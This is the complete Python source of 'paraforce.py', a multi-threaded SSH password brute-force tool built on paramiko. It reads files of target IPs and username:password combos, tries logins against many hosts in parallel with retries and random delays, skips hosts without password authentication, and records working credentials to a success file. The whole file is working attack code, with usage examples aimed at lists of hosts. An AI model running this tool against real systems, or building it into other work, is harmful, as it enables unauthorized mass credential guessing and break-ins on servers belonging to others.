# para(miko)+(brute)force = paraforce.py A password based ssh brute force tool

# usage example
# python3 paraforce.py -M ssh -H ips.txt -C wordlist.txt --loglevel INFO --succ_out SSH_SUCCESS.paraforce -o paraforce.log --retry_min_timer 3 --retry_max_timer 6 -T 100 -t 5 --socket_timeout 30
# python3 paraforce.py -M ssh --host 192.168.1.1 -U admin -P admin --single --debug

import paramiko
from time import sleep
import time
import random
from concurrent.futures import ThreadPoolExecutor
from threading import Lock
import argparse
import textwrap
import logging
import resource

# Constants
SUCCESS = 0
LOGIN_FAIL = 1
#CONNECTION_FAIL = 2
#CONNECTION_RESET = 3
BAD_AUTH_ERR = 4
GENERIC_FAIL = 5

class Module:
    def __init__(self) -> None:
        self.module_name = ""
        self.threading_mode = 1
        self.concurrent_creds = 0
        self.n_threads = 16        
        self.socket_timeout = 15
        self.auth_timeout = 15
        self.banner_timeout = 30
        self.attempt_delay = 0
        self.port = 0
        self.req_retries = 4
        self.wordlist = ""
        self.ip_list_filename = ""
        self.out_filepath = ''
        self.err_filename = "paraforce.log"
        self.out_logger = None
        self.err_logger = None
        self.retry_min_timer = 1
        self.retry_max_timer = 15
        self.creds_list = []
        self.ip_lst = []
        self.log_level_err = logging.ERROR
        self.req_counter = 0
        self._req_counter_lock = Lock()
        self.req_counter_success = 0
        self._req_counter_success_lock = Lock()


class SshModule (Module):
    '''Password based Brute-force SSH'''

    def __init__(self):
        Module.__init__(self)
        self.module_name = "ssh"
        self.port = 22

    def req_counter_incr(self):
        with self._req_counter_lock:
            self.req_counter += 1

    def req_counter_succ_incr(self):
        with self._req_counter_success_lock:
            self.req_counter_success += 1
          
    def check_multithread_login(self):        
        with ThreadPoolExecutor(self.n_threads) as executor:
                # submit tasks
                _ = [executor.submit(self.check_ip, ip) for ip in self.ip_lst]

    def check_ip(self, ip):
        if self.threading_mode and self.concurrent_creds:
            # needs refactoring, creating a threadpool here is inefficient
            # Also ips that have BAD_AUTH_ERR will still be executed nevertheless.
            # It is less complex and cost less to let them execute though
            with ThreadPoolExecutor(self.concurrent_creds) as executor2:
                # submit tasks and collect futures
                _ = [executor2.submit(self.check_creds, c, ip) for c in self.creds_list]
                # futures = [executor2.submit(self.check_creds, c, ip) for c in self.creds_list]
                # for future in futures:
                #     if future.cancelled():
                #         continue
                # try:
                #     res = future.result()
                #     if res == BAD_AUTH_ERR:
                #         executor2.shutdown(wait=False, cancel_futures=True)
                # except Exception:
                #     executor2.shutdown(wait=False, cancel_futures=True)
        else:
            for c in self.creds_list:
                result = self.check_creds(c, ip)
                if result == BAD_AUTH_ERR:
                    break

    def log_all(self, msg):
        self.out_logger.info(msg)
        self.err_logger.info(msg)

    def check_creds(self, c, ip):
        user = c[0]
        passwd = c[1]
        result = self.ssh_login(ip, user, passwd)
        if result == BAD_AUTH_ERR:
            # Host accepts connections with key so no point for us to continue checking, jump to the next host
            return BAD_AUTH_ERR

        elif result == SUCCESS:            
            self.log_all(f'\033[92mSUCCESS {ip} {user} {passwd} \033[0m')
            sleep(self.attempt_delay)            
            return SUCCESS

        elif result == LOGIN_FAIL:            
            self.err_logger.warning(f"\033[91m[-] SSH session failed on AUTHENTICATION login. ip: {ip} user: {user} pass: {passwd} \033[0m")
            sleep(self.attempt_delay)
            return LOGIN_FAIL

        elif result == GENERIC_FAIL:                          
            self.err_logger.warning(f"\033[91m[-] SSH session failed on login with ERROR. ip: {ip} user: {user} pass: {passwd} \033[0m")
            for attempt in range(self.req_retries):
                # enter a random sleep
                random_retry_delay = random.randrange(self.retry_min_timer, self.retry_max_timer)                
                self.err_logger.warning(f"\033[93m Retry #{attempt+1} with {random_retry_delay} sec delay. ip: {ip} user: {user} pass: {passwd} \033[0m")
                sleep(random_retry_delay)                    
                result = self.ssh_login(ip, user, passwd)
                
                if result == SUCCESS:                    
                    self.log_all(f'\033[92mSUCCESS {ip} {user} {passwd} \033[0m')
                    sleep(self.attempt_delay)                    
                    return SUCCESS

                elif result == LOGIN_FAIL:
                    self.err_logger.warning(f"\033[91m[-] SSH session failed on AUTHENTICATION login RETRY. ip: {ip} user: {user} pass: {passwd} \033[0m")
                    sleep(self.attempt_delay)
                    return LOGIN_FAIL

                elif result == BAD_AUTH_ERR:
                    self.err_logger.warning(f"\033[91m[-] SSH session failed on AUTHENTICATION login (BAD_AUTH_ERR) RETRY. ip: {ip} user: {user} pass: {passwd} \033[0m")                    
                    return BAD_AUTH_ERR

                else:
                    self.err_logger.warning(f"\033[91m[-] SSH session failed on #{attempt+1} RETRY login with ERROR. ip: {ip} user: {user} pass: {passwd} \033[0m")                    
            return GENERIC_FAIL
            
        else:
            self.err_logger.error(f"\033[91m[!!] What on Earth happened?! result = {result} ... SSH session failed on login. ip: {ip} user: {user} pass: {passwd} \033[0m")            
            sleep(self.attempt_delay)
            return GENERIC_FAIL    

    def ssh_login(self, ip, user, passwd):
        try:
            self.req_counter_incr()
            with paramiko.client.SSHClient() as client:
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, port=self.port, username=user, password=passwd, timeout=self.socket_timeout, auth_timeout=self.auth_timeout, banner_timeout=self.banner_timeout, allow_agent=False,look_for_keys=False )            
                self.req_counter_succ_incr()
            return SUCCESS
        except paramiko.AuthenticationException as ex:
            self.err_logger.error(f'AUTH Exception, {ip} {user} {passwd} case: {ex}')
            # case where password based or keyboard-interactive auth type is not supported, so we skip this host
            if "Bad authentication type" in str(ex):
                matches=["password","keyboard-interactive"]
                if not any(x in str(ex) for x in matches):
                    return BAD_AUTH_ERR              
            
            return LOGIN_FAIL

        except Exception as ex:                        
            self.err_logger.error(f'GENERIC Exception, {ip} {user} {passwd} case: {ex}')                            
            return GENERIC_FAIL
    

    def check_login(self):
        for ip in self.ip_lst:            
            self.check_ip(ip)


def parse_creds(protocol_module):    
    try:
        with open(protocol_module.wordlist) as file:
            lines = file.read().splitlines()            
            for line in lines:                
                if not line or line[0] == "#":
                    #print('Not line or comment')
                    continue
                            
                line_lst = line.split(':')
                user = line_lst[1]
                passwd = line_lst[2]                
                protocol_module.creds_list.append((user,passwd))            
                
    except FileNotFoundError as fe:
        print("\n\033[91m Error: "+str(fe)+"\033[0m \n")
        print("\n\033[91m Use either -C for file or -U and -P for single test. For further options use -h\033[0m \n")
        exit(1)
    except Exception as e:
        print("\n\033[91m Error: "+str(e)+"\033[0m \n")
        print("\n\033[91m Check the syntax using -h\033[0m \n")
        exit(1)

def parse_ips(protocol_module):    
    try:
        with open(protocol_module.ip_list_filename) as file:
            lines = file.read().splitlines()            
            for line in lines:                
                if not line or line[0] == "#":
                    #print('Not line or comment')
                    continue
                            
                protocol_module.ip_lst.append(line)                
                
    except FileNotFoundError as fe:
        print("\n\033[91m Error: "+str(fe)+"\033[0m \n")
        print("\n\033[91m Use either -H for file or --host for single ip. For further options use -h\033[0m \n")
        exit(1)
    except Exception as e:
        print("\n\033[91m Error: "+str(e)+"\033[0m \n")
        print("\n\033[91m Check the syntax using -h\033[0m \n")
        exit(1)


# argparse
def check_args():  

    parser = argparse.ArgumentParser(description='Execute the tasks that were configured in the conf file',
                                        epilog=textwrap.dedent('''
                                                Examples:
                                                python3 paraforce.py -H ips.txt -C wordlist.txt --port 222 --single -M ssh
                                                python3 paraforce.py -H ips.txt -C wordlist.txt --port 222 --threads 500 -M ssh --loglevel INFO
                                                python3 paraforce.py --port 222 -C my_wordlist.txt -H my_hosts.txt --succ_out success_list.txt --req_retries 6 -M ssh
                                                python3 paraforce.py -H ips.txt -C wordlist.txt --port 222 --threads 500 --socket_timeout 30 --auth_timeout 70 --banner_timeout 200 --attempt_delay 2 -M ssh
                                                python3 paraforce.py -H my_hosts.txt -C my_wordlist.txt -o paraforce.error.log -t 3 -M ssh
                                                python3 paraforce.py -H my_hosts.txt -C my_wordlist.txt -o success_list.txt -T 50 -t 3 -M ssh
                                                python3 paraforce.py -H ips.txt -C wordlist.txt -T 100 -t 3 -M ssh --loglevel INFO
                                                python3 paraforce.py -H my_hosts.txt -C my_wordlist.txt -o success_list.txt -T 50 -t 3 -M ssh --retry_min_timer 5 --retry_max_timer 20
                                                python3 paraforce.py -M ssh -H ips.txt -C wordlist.txt --loglevel INFO --succ_out SSH_SUCCESS.paraforce -o paraforce.log --retry_min_timer 3 --retry_max_timer 6 -T 100 -t 5 --socket_timeout 20
                                                python3 paraforce.py -M ssh --host 192.168.1.1 -U admin -P admin --single --debug
                                                '''),
                                        formatter_class=argparse.RawTextHelpFormatter)
                                        
    parser.add_argument('-M','--module', action='store', required=True,

                        help=textwrap.dedent('''\
                            Select which module to run. Availiable modules: ssh
                            
                            ''')
                        )

    parser.add_argument('-p','--port', action='store', required=False,

                        help=textwrap.dedent('''\
                            Set port (default 22)
                            
                            ''')
                        )

    parser.add_argument('-T','--threads', action='store', required=False,

                        help=textwrap.dedent('''\
                            Enables multithreading and sets the num of max threads (default option with 16 threads). Each thread tests one host, not multiple connections on the same host
                            
                            ''')
                        )

    parser.add_argument('-t','--threads_per_host', action='store', required=False,

                        help=textwrap.dedent('''\
                            [Experimental] Enables multithreading and sets the num of threads to use for credentials. Each thread tests one credential combo on the host, meaning multiple connections on the same host
                            
                            ''')
                        )

    parser.add_argument('--single', action='store_true', required=False,

                        help=textwrap.dedent('''\
                            Disables multithreading and uses a single thread
                            
                            ''')
                        )

    parser.add_argument('-C','--combo', action='store', required=False,

                        help=textwrap.dedent('''\
                            Set the path of the wordlist filename in this format :username:passwd
                            
                            ''')
                        )

    parser.add_argument('-H','--hosts', action='store', required=False,

                        help=textwrap.dedent('''\
                            Set the path of the filename containing the ips. One ip per line
                            
                            ''')
                        )
    parser.add_argument('--host', action='store', required=False,

                        help=textwrap.dedent('''\
                            Set ip to test
                            
                            ''')
                        )

    parser.add_argument('-U','--user', action='store', required=False,

                        help=textwrap.dedent('''\
                            Set username to test
                            
                            ''')
                        )

    parser.add_argument('-P','--passwd', action='store', required=False,

                        help=textwrap.dedent('''\
                            Set password to test
                            
                            ''')
                        )

    parser.add_argument('--succ_out', action='store', required=False,

                        help=textwrap.dedent('''\
                            Set the path of the filename to store the credentials that succeded
                            
                            ''')
                        )

    parser.add_argument('-o','--out', action='store', required=False,

                        help=textwrap.dedent('''\
                            Set the path of the filename to store the full log
                            
                            ''')
                        )

    parser.add_argument('--socket_timeout', action='store', required=False,

                        help=textwrap.dedent('''\
                            Set the socket timeout (default 15 sec)
                            
                            ''')
                        )

    parser.add_argument('--auth_timeout', action='store', required=False,

                        help=textwrap.dedent('''\
                            Set the time that we await for the authentication response before we expire (default 15 sec)
                            
                            ''')
                        )

    parser.add_argument('--banner_timeout', action='store', required=False,

                        help=textwrap.dedent('''\
                            Set the timeout we await the ssh banner (default 30 sec)
                            
                            ''')
                        )

    parser.add_argument('--attempt_delay', action='store', required=False,

                        help=textwrap.dedent('''\
                            Set the time delay between the retries (default 0). Works only for --single and -T modes. It doesn't make sense to use it with -t if you need to limit the rate. Do not use it with -t if you are not sure what you are doing
                            
                            ''')
                        )

    parser.add_argument('--req_retries', action='store', required=False,

                        help=textwrap.dedent('''\
                            Set the number of retries (default 4)
                            
                            ''')
                        )

    parser.add_argument('--retry_min_timer', action='store', required=False,

                        help=textwrap.dedent('''\
                            A random delay is selected before each retry request from a range. This option sets the minimum value of the range (default 1). Do not use it with -t if you are not sure what you are doing
                            
                            ''')
                        )

    parser.add_argument('--retry_max_timer', action='store', required=False,

                        help=textwrap.dedent('''\
                            A random delay is selected before each retry request from a range. This option sets the maximum value of the range (default 15). Do not use it with -t if you are not sure what you are doing
                            
                            ''')
                        )

    parser.add_argument('--debug', action='store_true', required=False,

                        help=textwrap.dedent('''\
                            An option to display debug logs from paramiko lib. Best used with --single option
                            
                            ''')
                        )

    parser.add_argument('--loglevel', action='store', required=False,

                        help=textwrap.dedent('''\
                            An option to set the loglevel on error logs. Default is ERROR. Availiable options: [DEBUG,INFO,WARNING,ERROR,CRITICAL]
                            
                            ''')
                        )


                        
    options = parser.parse_args()    

    protocol_module = None

    if options.module == "ssh":        
        protocol_module = SshModule()        
    else:
        print(f"{options.module} is not a valid module. Use -h to see the options")
        exit(1)

    if options.port:        
        protocol_module.port = int(options.port)        
        
    if options.threads:        
        protocol_module.n_threads = int(options.threads)
        protocol_module.threading_mode = 1
        if protocol_module.n_threads <= 1:
            print('\nUse --single for 1 thread. Exiting...')
            exit(-1)
        
    if options.threads_per_host:        
        protocol_module.concurrent_creds = int(options.threads_per_host)
        protocol_module.threading_mode = 1
        if protocol_module.concurrent_creds <= 1:
            print('\nUse -T for multiple connections on many hosts or --single for 1 thread. Exiting...')
            exit(-1)        

    if options.single:                
        protocol_module.threading_mode = 0

    if options.hosts or options.host:
        if options.hosts:
            protocol_module.ip_list_filename = options.hosts
        else:
            protocol_module.ip_lst.append(options.host)
    else:
        print('You need to specify a host ip (--host) or provide a file of hosts (-H)')
        exit(-1)

    if (options.user and options.passwd) or options.combo:
        if options.user and options.passwd:
            protocol_module.creds_list.append((options.user,options.passwd))
        else:
            protocol_module.wordlist = options.combo
        
    else:
        print('You need to specify a username (-U) and a password (-P) or provide a file of credentials (-C)')
        exit(-1)
    
    if options.succ_out:        
        protocol_module.out_filepath = options.succ_out

    if options.out:        
        protocol_module.err_filename = options.out

    if options.socket_timeout:        
        protocol_module.socket_timeout = float(options.socket_timeout)   

    if options.auth_timeout:        
        protocol_module.auth_timeout = float(options.auth_timeout)   

    if options.banner_timeout:        
        protocol_module.banner_timeout = float(options.banner_timeout)   

    if options.attempt_delay:        
        protocol_module.attempt_delay = float(options.attempt_delay)   

    if options.req_retries:        
        protocol_module.req_retries = int(options.req_retries)   

    if options.retry_min_timer:        
        protocol_module.retry_min_timer = int(options.retry_min_timer)   

    if options.retry_max_timer:        
        protocol_module.retry_max_timer = int(options.retry_max_timer)   

    if options.loglevel:
        if options.loglevel in ["DEBUG","INFO","WARNING","ERROR","CRITICAL"]:
            if options.loglevel == "DEBUG":
                protocol_module.log_level_err = logging.DEBUG
            elif options.loglevel == "INFO":
                protocol_module.log_level_err = logging.INFO
            elif options.loglevel == "WARNING":
                protocol_module.log_level_err = logging.WARNING
            elif options.loglevel == "ERROR":
                protocol_module.log_level_err = logging.ERROR
            elif options.loglevel == "CRITICAL":
                protocol_module.log_level_err = logging.CRITICAL
        else:
            print(f'{options.loglevel} not a valid option. See -h for more info')
            exit(1)

    if options.debug:                
        logging.basicConfig(level=logging.DEBUG)
        protocol_module.log_level_err = logging.DEBUG
        logging.getLogger("paramiko").setLevel(logging.DEBUG)        
    else:
        #logging.basicConfig(level=logging.INFO)        
        logging.getLogger('paramiko.transport').disabled = True
        #paramiko.util.log_to_file("paraforce_paramiko.error", level = "ERROR")

    return protocol_module
        
def show_info():
    if isinstance(protocol_module, SshModule):
        print("\nModule:",protocol_module.module_name)
        if protocol_module.threading_mode == 1:
            print("Mode: Multi-thread")
            print("Max Threads:",protocol_module.n_threads)
            print("Parallel connections on each host:",protocol_module.concurrent_creds)            
        else:
            print("Mode: Single")
        
        print("\nPort:",protocol_module.port)        
        
        
        print("\nWordlist:",protocol_module.wordlist)
        print("IP List:",protocol_module.ip_list_filename)
        print("Success Output File:",protocol_module.out_filepath)
        print("Errorlog:",protocol_module.err_filename)
        print("\nsocket_timeout:",protocol_module.socket_timeout)
        print("auth_timeout:",protocol_module.auth_timeout)
        print("banner_timeout:",protocol_module.banner_timeout)
        print("attempt_delay:",protocol_module.attempt_delay)
        print("req_retries:",protocol_module.req_retries)                
        print("retry_min_timer:",protocol_module.retry_min_timer)
        print("retry_max_timer:",protocol_module.retry_max_timer)        
        print("\nLoaded Creds:",len(protocol_module.creds_list))
        print("Loaded IPs:",len(protocol_module.ip_lst))
    else:
        print(f"{protocol_module} is not a valid module. Use -h to see the options")  
        exit(1)
    
    print('\n')    

def setup_logger(name, log_file, level=logging.INFO, formatter=None, console_log=False):  

    if formatter is None:
        formatter = logging.Formatter('%(asctime)s %(levelname)s %(message)s')
    
    if log_file or console_log:
        logger = logging.getLogger(name)
        logger.setLevel(level)

    if log_file:
        file_handler = logging.FileHandler(log_file)        
        file_handler.setFormatter(formatter)
        logger.addHandler(file_handler)

    if console_log:
        console_handler = logging.StreamHandler()
        console_handler.setFormatter(formatter)
        logger.addHandler(console_handler)

    return logger


def setup_loggers(protocol_module):
    out_formatter = logging.Formatter('%(message)s')
    err_formatter = logging.Formatter('%(asctime)s %(levelname)s %(message)s')
    protocol_module.out_logger = setup_logger('out_logger', protocol_module.out_filepath, level=logging.INFO, formatter=out_formatter, console_log=True)
    protocol_module.err_logger = setup_logger('err_logger', protocol_module.err_filename, level=protocol_module.log_level_err, formatter=err_formatter)


def raise_nofile(nofile_atleast=2048):

    soft,ohard = resource.getrlimit(resource.RLIMIT_NOFILE)
    hard = ohard  

    if soft<nofile_atleast:
        soft = nofile_atleast

        if hard<soft:
            hard = soft

        try:
            resource.setrlimit(resource.RLIMIT_NOFILE,(soft,hard))
            print(f'\033[92m\nNum of ulimit set to {nofile_atleast}: OK!\033[0m')
        except (ValueError,resource.error):
            try:
               hard = soft               
               resource.setrlimit(resource.RLIMIT_NOFILE,(soft,hard))
               print(f'\033[92m\nNum of ulimit set to {nofile_atleast}: OK!\033[0m')
            except Exception:
               print('\x1b[31;1mFailed to set ulimit. Exiting...\x1b[0m')
               exit(-1)               
    else:
        print(f'\033[92m\nNum of ulimit {nofile_atleast}: OK!\033[0m')

    return soft,hard          


if __name__ == '__main__':    

    try:

        soft,hard = raise_nofile()
        protocol_module = check_args()       

        # start timer for performance measurements
        start_time = time.time()

        if isinstance(protocol_module, SshModule):

            if len(protocol_module.creds_list) == 0:
                parse_creds(protocol_module)
                
            if len(protocol_module.ip_lst) == 0:
                parse_ips(protocol_module)

            setup_loggers(protocol_module)
            show_info()           

            if protocol_module.threading_mode:                
                protocol_module.check_multithread_login()
            else:                
                protocol_module.check_login()    

        # stop timer and display time
        end_time = time.time()
        total_time = end_time - start_time
        exec_time = f'\n\nExecution time: {total_time:.1f} seconds.\n'
        print(exec_time)   
        protocol_module.err_logger.info(f'Total time: {total_time}')

        # req volume
        succ_msg_req = f"Success Req: {protocol_module.req_counter_success}"
        print(succ_msg_req)   
        protocol_module.err_logger.info(succ_msg_req)

        total_msg_req = f"Total Requests:{protocol_module.req_counter}"
        print(total_msg_req)   
        protocol_module.err_logger.info(total_msg_req)        

    except Exception as ex:
        print(str(ex))
        protocol_module.err_logger.critical(str(ex))            
